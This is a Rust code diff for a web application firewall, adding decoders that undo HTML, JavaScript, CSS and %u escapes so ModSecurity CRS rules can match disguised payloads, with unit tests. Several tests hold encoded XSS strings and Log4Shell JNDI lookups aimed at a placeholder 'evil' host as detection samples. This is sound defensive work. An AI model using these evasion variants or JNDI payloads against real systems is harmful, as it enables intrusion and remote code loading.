@@ -383,6 +383,13 @@ impl InspectionModule for WafModule {
 /// trade one blind spot for another. Decoding runs twice so double-encoded
 /// payloads reduce to plain text as well.
 ///
+/// Beyond percent-encoding, CRS rules declare the escapes they expect to have
+/// been undone — `t:htmlEntityDecode`, `t:jsDecode`, `t:cssDecode` — and their
+/// patterns are written against the result. Those transformations are applied
+/// in chains, in the two orders CRS itself uses, adding one form each. They run
+/// only when the percent-decoded text contains an escape character to act on,
+/// so ordinary traffic pays one scan.
+///
 /// `plus_is_space` suits query strings and form bodies, where `+` encodes a
 /// space. It is wrong for a path, where `+` is a literal character.
 ///
@@ -391,7 +398,11 @@ impl InspectionModule for WafModule {
 fn zone_text(raw: &str, plus_is_space: bool) -> Vec<String> {
     let has_pct  = raw.contains('%');
     let has_plus = plus_is_space && raw.contains('+');
-    if !has_pct && !has_plus {
+    // One pass for the characters the decoders below act on. Text carrying
+    // none of them — which is most text — costs this scan and one allocation.
+    let has_esc  = raw.as_bytes().iter().any(|b| matches!(b, b'&' | b'\\' | 0));
+
+    if !has_pct && !has_plus && !has_esc {
         return vec![raw.to_string()];
     }
 
@@ -400,21 +411,65 @@ fn zone_text(raw: &str, plus_is_space: bool) -> Vec<String> {
     // '+' means space in a query string, and must be substituted before
     // percent-decoding rather than after, or "%2B" would become a space too.
     let base = if has_plus { raw.replace('+', " ") } else { raw.to_string() };
-    if base != raw {
-        forms.push(base.clone());
-    }
+    push_unique(&mut forms, base.clone());
 
     let once = percent_decode(&base);
-    if once != base {
-        forms.push(once.clone());
-    }
+    push_unique(&mut forms, once.clone());
+    push_unique(&mut forms, percent_decode(&once));
 
-    let twice = percent_decode(&once);
-    if twice != once {
-        forms.push(twice);
+    // The chains start from percent-decoded text, not from the text as
+    // received: an escape is routinely encoded on the way in, and
+    // `%26lt%3Bscript%26gt%3B` is `&lt;script&gt;` is `<script>`. Gating on
+    // the raw text alone missed every payload that arrived through a browser's
+    // own encoding, which is most of them.
+    //
+    // `urlDecodeUni` differs from `percent_decode` only over `%uHHHH`, so the
+    // form already decoded above is reused unless the text carries one.
+    let uni = if has_pct && base.to_ascii_lowercase().contains("%u") {
+        url_decode_uni(&base)
+    } else {
+        once.clone()
+    };
+
+    // urlDecodeUni is a transformation in its own right, and rules declare it
+    // on its own: `%uFF1C` has to become a form whether or not any escape
+    // survives for the chains below to work on.
+    push_unique(&mut forms, uni.clone());
+
+    // The transformation chains CRS declares, in its own order.
+    if uni.as_bytes().iter().any(|b| matches!(b, b'&' | b'\\' | 0)) {
+        // 941xxx, the XSS sets:
+        //   t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls
+        push_unique(
+            &mut forms,
+            remove_nulls(&css_decode(&js_decode(&html_entity_decode(&uni)))),
+        );
+
+        // 944150 and the rest of the Log4Shell family:
+        //   t:urlDecodeUni,t:jsDecode,t:htmlEntityDecode
+        // The order matters: an entity that decodes to a backslash is an
+        // escape to the first chain and plain text to this one.
+        //
+        // Order has one consequence worth knowing: jsDecode reads `\3c` as an
+        // octal escape and consumes it before cssDecode ever sees it, so a CSS
+        // escape beginning with an octal digit does not survive the first
+        // chain. libmodsecurity does exactly the same thing, and the rules were
+        // written against that, so this follows it rather than improving on it.
+        push_unique(&mut forms, html_entity_decode(&js_decode(&uni)));
     }
 
     forms
+}
+
+/// Add a form unless an identical one is already present.
+///
+/// The chains converge on the same text as the percent-decoded forms far more
+/// often than not — most requests carry one kind of encoding, not four — and a
+/// duplicate form costs a full pass of every rule in the policy.
+fn push_unique(forms: &mut Vec<String>, form: String) {
+    if !forms.iter().any(|f| f == &form) {
+        forms.push(form);
+    }
 }
 
 /// Percent-decode one string: byte by byte, then read as UTF-8 with anything
@@ -431,6 +486,307 @@ fn zone_text(raw: &str, plus_is_space: bool) -> Vec<String> {
 /// else the field contains, and valid input decodes exactly as it did before.
 fn percent_decode(s: &str) -> String {
     String::from_utf8_lossy(&urlencoding::decode_binary(s.as_bytes())).into_owned()
+}
+
+// ─── Decoders ────────────────────────────────────────────
+
+// The escapes CRS rules are written to see through.
+//
+// A CRS rule declares the transformations it assumes and its pattern is
+// written against the *result*, so matching that pattern against the text as
+// received catches the literal payload and misses every escaped variant.
+// `scripts/modsec2easywaf.py` refuses such rules rather than shipping
+// protection the encoding it names walks straight through — 36 of them,
+// including all three Log4Shell rules.
+//
+// These follow **libmodsecurity's** implementations, not the language
+// standards they are named after, because the patterns were written and
+// tested against its behaviour, quirks included: HTML entities truncate to one
+// byte, only five names are recognised, and a semicolon is optional. Decoding
+// "correctly" here would mean decoding differently from the engine the rules
+// come from.
+//
+// Each works on bytes and returns text: an escape can name a byte that is not
+// valid UTF-8 on its own, and a lossy conversion keeps the ASCII around it
+// visible — the same reasoning as `percent_decode`.
+//
+// Where libmodsecurity is stricter than these are — accepting only `\u`, never
+// `\U` — the looser reading is deliberate. An extra form can only add a match,
+// never remove one, so the cost of being wrong is a false positive that shows
+// up in the Traffic Monitor, rather than a silent hole.
+
+/// The value of `digits` read as hexadecimal, or None unless every byte is a
+/// hex digit.
+fn hex_value(digits: &[u8]) -> Option<u32> {
+    let mut value: u32 = 0;
+    for d in digits {
+        value = value * 16 + (*d as char).to_digit(16)?;
+    }
+    Some(value)
+}
+
+/// One byte from a 16-bit escape.
+///
+/// The full-width block `FF01`–`FF5E` folds onto ASCII, which is what makes
+/// `＜` the `<` an XSS rule is looking for rather than an unrelated byte.
+/// Everything else keeps its low byte, as libmodsecurity does.
+fn fold_wide(code: u32) -> u8 {
+    if code & 0xFF00 == 0xFF00 {
+        ((code & 0xFF) as u8).wrapping_add(0x20)
+    } else {
+        (code & 0xFF) as u8
+    }
+}
+
+/// `urlDecodeUni`: percent-decoding that also understands `%uHHHH`.
+///
+/// That form is IIS's rather than the URL standard's, and CRS still decodes it
+/// because the servers behind a WAF still accept it.
+fn url_decode_uni(s: &str) -> String {
+    let b = s.as_bytes();
+    let mut out = Vec::with_capacity(b.len());
+    let mut i = 0;
+
+    while i < b.len() {
+        if b[i] == b'%' {
+            if i + 6 <= b.len()
+                && b[i + 1] | 0x20 == b'u'
+                && let Some(code) = hex_value(&b[i + 2..i + 6])
+            {
+                out.push(fold_wide(code));
+                i += 6;
+                continue;
+            }
+            if i + 3 <= b.len()
+                && let Some(code) = hex_value(&b[i + 1..i + 3])
+            {
+                out.push(code as u8);
+                i += 3;
+                continue;
+            }
+        }
+        out.push(b[i]);
+        i += 1;
+    }
+
+    String::from_utf8_lossy(&out).into_owned()
+}
+
+/// `htmlEntityDecode`: `&lt;`, `&#60;`, `&#x3c;` — and nothing else.
+fn html_entity_decode(s: &str) -> String {
+    if !s.contains('&') {
+        return s.to_string();
+    }
+
+    let b = s.as_bytes();
+    let mut out = Vec::with_capacity(b.len());
+    let mut i = 0;
+
+    while i < b.len() {
+        if b[i] == b'&'
+            && let Some((byte, used)) = entity_at(&b[i + 1..])
+        {
+            out.push(byte);
+            i += 1 + used;
+            continue;
+        }
+        out.push(b[i]);
+        i += 1;
+    }
+
+    String::from_utf8_lossy(&out).into_owned()
+}
+
+/// One entity after its `&`: the byte it stands for, and how much it used.
+///
+/// Returns None for anything else, so `&dollar;` and a bare `&` between query
+/// parameters are left exactly as they are — which is also what libmodsecurity
+/// does, and what the rules were written against.
+fn entity_at(rest: &[u8]) -> Option<(u8, usize)> {
+    if rest.first() == Some(&b'#') {
+        let (radix, start) = match rest.get(1) {
+            Some(c) if c | 0x20 == b'x' => (16, 2),
+            _                           => (10, 1),
+        };
+
+        let mut value: u32 = 0;
+        let mut i = start;
+        while let Some(d) = rest.get(i).and_then(|c| (*c as char).to_digit(radix)) {
+            // Saturating, because the digits come from a client: `&#99999…`
+            // must truncate like any other value, not panic in a debug build.
+            value = value.saturating_mul(radix).saturating_add(d);
+            i += 1;
+        }
+        if i == start {
+            return None;
+        }
+
+        // The semicolon is optional, to libmodsecurity as to a browser.
+        if rest.get(i) == Some(&b';') {
+            i += 1;
+        }
+        // Truncated to one byte: `&#256;` is a NUL, and a rule written against
+        // libmodsecurity expects exactly that.
+        return Some(((value & 0xFF) as u8, i));
+    }
+
+    for (name, byte) in [
+        (&b"quot"[..], b'"'),
+        (&b"amp"[..],  b'&'),
+        (&b"lt"[..],   b'<'),
+        (&b"gt"[..],   b'>'),
+        (&b"nbsp"[..], 0xA0u8),
+    ] {
+        if rest.len() >= name.len() && rest[..name.len()].eq_ignore_ascii_case(name) {
+            let mut used = name.len();
+            if rest.get(used) == Some(&b';') {
+                used += 1;
+            }
+            return Some((byte, used));
+        }
+    }
+
+    None
+}
+
+/// `jsDecode`: the escapes a JavaScript string literal may carry.
+fn js_decode(s: &str) -> String {
+    if !s.contains('\\') {
+        return s.to_string();
+    }
+
+    let b = s.as_bytes();
+    let mut out = Vec::with_capacity(b.len());
+    let mut i = 0;
+
+    while i < b.len() {
+        if b[i] != b'\\' || i + 1 >= b.len() {
+            out.push(b[i]);
+            i += 1;
+            continue;
+        }
+
+        let c = b[i + 1];
+
+        if c | 0x20 == b'u'
+            && i + 6 <= b.len()
+            && let Some(code) = hex_value(&b[i + 2..i + 6])
+        {
+            out.push(fold_wide(code));
+            i += 6;
+            continue;
+        }
+
+        if c | 0x20 == b'x'
+            && i + 4 <= b.len()
+            && let Some(code) = hex_value(&b[i + 2..i + 4])
+        {
+            out.push(code as u8);
+            i += 4;
+            continue;
+        }
+
+        if (b'0'..=b'7').contains(&c) {
+            let mut value: u32 = 0;
+            let mut used = 0;
+            while used < 3
+                && i + 1 + used < b.len()
+                && (b'0'..=b'7').contains(&b[i + 1 + used])
+            {
+                value = value * 8 + (b[i + 1 + used] - b'0') as u32;
+                used += 1;
+            }
+            out.push((value & 0xFF) as u8);
+            i += 1 + used;
+            continue;
+        }
+
+        // The named escapes, then the rule libmodsecurity applies to every
+        // other character: drop the backslash and keep it. That is the whole
+        // point for a rule looking for a tag — `\<script\>` is `<script>`.
+        out.push(match c {
+            b'a' => 0x07,
+            b'b' => 0x08,
+            b'f' => 0x0C,
+            b'n' => 0x0A,
+            b'r' => 0x0D,
+            b't' => 0x09,
+            b'v' => 0x0B,
+            other => other,
+        });
+        i += 2;
+    }
+
+    String::from_utf8_lossy(&out).into_owned()
+}
+
+/// `cssDecode`: the backslash-hex escape CSS allows, `\3c` for `<`.
+fn css_decode(s: &str) -> String {
+    if !s.contains('\\') {
+        return s.to_string();
+    }
+
+    let b = s.as_bytes();
+    let mut out = Vec::with_capacity(b.len());
+    let mut i = 0;
+
+    while i < b.len() {
+        if b[i] != b'\\' || i + 1 >= b.len() {
+            out.push(b[i]);
+            i += 1;
+            continue;
+        }
+
+        let c = b[i + 1];
+
+        // A backslash before a newline is a line continuation: both go, and
+        // so does the second half of a CRLF pair.
+        if c == b'\n' || c == b'\r' {
+            i += 2;
+            if i < b.len() && (b[i] == b'\n' || b[i] == b'\r') && b[i] != c {
+                i += 1;
+            }
+            continue;
+        }
+
+        if c.is_ascii_hexdigit() {
+            // Up to six digits, of which only the low byte survives — the same
+            // truncation as an HTML entity, so `\00003c` is `<`.
+            let mut value: u32 = 0;
+            let mut used = 0;
+            while used < 6
+                && i + 1 + used < b.len()
+                && b[i + 1 + used].is_ascii_hexdigit()
+            {
+                value = value * 16 + (b[i + 1 + used] as char).to_digit(16).unwrap_or(0);
+                used += 1;
+            }
+            out.push((value & 0xFF) as u8);
+            i += 1 + used;
+
+            // CSS lets one whitespace character end an escape, and it belongs
+            // to the escape rather than to the text: `\3c script` is
+            // `<script`, which is exactly what the rule is looking for.
+            if i < b.len() && matches!(b[i], b' ' | b'\t' | b'\n' | b'\r' | 0x0C) {
+                i += 1;
+            }
+            continue;
+        }
+
+        out.push(c);
+        i += 2;
+    }
+
+    String::from_utf8_lossy(&out).into_owned()
+}
+
+/// `removeNulls`: a NUL byte inside a payload splits it for a rule while the
+/// application behind reads straight past it.
+fn remove_nulls(s: &str) -> String {
+    if !s.contains('\0') {
+        return s.to_string();
+    }
+    s.chars().filter(|c| *c != '\0').collect()
 }
 
 // ─── decide ──────────────────────────────────────────────
@@ -731,6 +1087,126 @@ mod tests {
         assert_eq!(super::percent_decode("plain"), "plain");
         assert_eq!(super::percent_decode("%2545"), "%45", "one level per call, as before");
         assert_eq!(super::percent_decode("100%"), "100%", "a stray percent is left alone");
+    }
+
+    #[test]
+    fn html_entities_decode_the_way_libmodsecurity_does() {
+        let d = super::html_entity_decode;
+        assert_eq!(d("&lt;script&gt;"),      "<script>");
+        assert_eq!(d("&#60;script&#62;"),    "<script>");
+        assert_eq!(d("&#x3c;script&#X3E;"),  "<script>");
+        assert_eq!(d("&quot;"),              "\"");
+
+        // The semicolon is optional, to libmodsecurity as to a browser.
+        assert_eq!(d("&lt&gt"),   "<>");
+        assert_eq!(d("&#60&#62"), "<>");
+
+        // Only five names are recognised, so everything else is text — and an
+        // '&' between query parameters must come through untouched, or every
+        // ordinary request would grow a second, wrong form.
+        assert_eq!(d("&dollar;&lbrace;"), "&dollar;&lbrace;");
+        assert_eq!(d("a=1&b=2"),          "a=1&b=2");
+        assert_eq!(d("plain"),            "plain");
+        assert!(!d("x&nbsp;y").contains("nbsp"), "a named entity was left whole");
+
+        // Truncated to one byte, quirk included: a rule written against
+        // libmodsecurity expects `&#256;` to be a NUL, not 'Ā'.
+        assert_eq!(d("&#256;"), "\u{0}");
+    }
+
+    #[test]
+    fn javascript_escapes_decode_the_way_libmodsecurity_does() {
+        let d = super::js_decode;
+        assert_eq!(d(r"\x3cscript\x3e"),   "<script>");
+        assert_eq!(d(r"\u003cscript\u003e"), "<script>");
+        assert_eq!(d(r"\74script\76"),     "<script>", "octal");
+        assert_eq!(d(r"\n\t"),             "\n\t");
+
+        // The full-width block folds onto ASCII, which is the whole reason
+        // this matters: `\uff1c` is the '<' the XSS rules are looking for.
+        // Only the escape is folded — a literal '＜' in the text is left alone,
+        // as libmodsecurity leaves it.
+        assert_eq!(d(r"\uff1cscript\uff1e"), "<script>");
+
+        // An escape with no meaning keeps the character and loses the
+        // backslash, so `\<script\>` reaches a rule as a tag.
+        assert_eq!(d(r"\<script\>"), "<script>");
+
+        assert_eq!(d("no escapes here"), "no escapes here");
+        assert_eq!(d(r"trailing\"),      r"trailing\", "a lone backslash is text");
+    }
+
+    #[test]
+    fn css_escapes_decode_the_way_libmodsecurity_does() {
+        let d = super::css_decode;
+        assert_eq!(d(r"\3c script"),    "<script", "one space ends the escape");
+        assert_eq!(d(r"\00003cscript"), "<script", "six digits, low byte kept");
+        assert_eq!(d("\\\n<script"),    "<script", "a line continuation is removed");
+        assert_eq!(d(r"\<script"),      "<script");
+        assert_eq!(d("nothing to do"),  "nothing to do");
+    }
+
+    #[test]
+    fn percent_u_escapes_decode() {
+        let d = super::url_decode_uni;
+        assert_eq!(d("%u003cscript%u003e"), "<script>");
+        assert_eq!(d("%uff1cscript"),       "<script", "full-width folds to ASCII");
+        assert_eq!(d("%3Cscript%3E"),       "<script>", "ordinary escapes still decode");
+        assert_eq!(d("100%"),               "100%");
+        assert_eq!(d("%zz"),                "%zz");
+    }
+
+    #[test]
+    fn shipped_rules_see_through_the_escapes_crs_declares() {
+        // The XSS rules are written against text that has been through
+        // htmlEntityDecode, jsDecode and cssDecode. EasyWAF undid none of them
+        // before 0.11.0, so every one of these reached the rule as the escape
+        // text it is, and matched nothing.
+        let re = Regex::new(&pattern("941-xss.rules.toml", 941001)).unwrap();
+        for field in [
+            "q=&#60;script&#62;alert(1)",
+            "q=&lt;script&gt;alert(1)",
+            "q=&#x3c;script&#x3e;alert(1)",
+            r"q=\x3cscript\x3ealert(1)",
+            r"q=\u003cscript\u003ealert(1)",
+            r"q=\uff1cscript\uff1ealert(1)",
+            r"q=\<script\>alert(1)",
+            "q=%u003cscript%u003e",
+            // The entity itself percent-encoded, which is how it arrives from
+            // a browser: the chain starts by undoing that.
+            "q=%26lt%3Bscript%26gt%3B",
+        ] {
+            let forms = super::zone_text(field, true);
+            assert!(forms.iter().any(|f| re.is_match(f)),
+                    "rule 941001 missed {field:?}; forms were {forms:?}");
+        }
+    }
+
+    #[test]
+    fn log4shell_survives_the_escapes_it_hides_behind() {
+        // CRS 944150 declares t:jsDecode,t:htmlEntityDecode, which is why the
+        // converter refuses it and sets/1030-java says Log4Shell is not
+        // covered. These are the forms it is written to see through.
+        for field in [
+            r"x=\u0024\u007bjndi:ldap://evil/a\u007d",
+            "x=&#36;&#123;jndi:ldap://evil/a&#125;",
+            "x=%24%7bjndi:ldap://evil/a%7d",
+        ] {
+            let forms = super::zone_text(field, true);
+            assert!(forms.iter().any(|f| f.contains("${jndi:ldap://")),
+                    "{field:?} never reduced to the payload: {forms:?}");
+        }
+    }
+
+    #[test]
+    fn ordinary_text_still_costs_one_form() {
+        // The decoders run on every request, so text they cannot change must
+        // not produce a second copy of itself for every rule to be matched
+        // against twice.
+        assert_eq!(super::zone_text("q=red running shoes", true).len(), 1);
+        assert_eq!(super::zone_text("a=1&b=2", true), vec!["a=1&b=2".to_string()],
+                   "an ampersand between parameters is not an entity");
+        assert_eq!(super::zone_text("/static/app.js", false).len(), 1);
     }
 
     #[test]
